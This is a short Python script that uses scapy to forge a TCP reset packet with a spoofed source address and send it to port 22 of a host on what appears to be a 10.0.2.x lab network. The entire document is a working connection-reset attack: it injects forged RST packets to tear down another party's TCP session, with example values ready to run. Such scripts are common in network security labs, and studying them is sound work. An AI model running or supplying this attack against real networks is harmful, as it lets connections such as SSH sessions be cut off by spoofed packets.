from scapy.all import *

def send_rst(src_ip, dst_ip, src_port, dst_port, seq_num):
    ip_layer = IP(src=src_ip, dst=dst_ip)
    tcp_layer = TCP(sport=src_port, dport=dst_port, flags="R", seq=seq_num)
    packet = ip_layer/tcp_layer
    send(packet, verbose=0)
    print(f"Sent TCP RST packet from {src_ip}:{src_port} to {dst_ip}:{dst_port} with SEQ={seq_num}")

# Example usage
src_ip = "10.0.2.5"
dst_ip = "10.0.2.4"
src_port = 12345
dst_port = 22
seq_num = 1000

send_rst(src_ip, dst_ip, src_port, dst_port, seq_num)
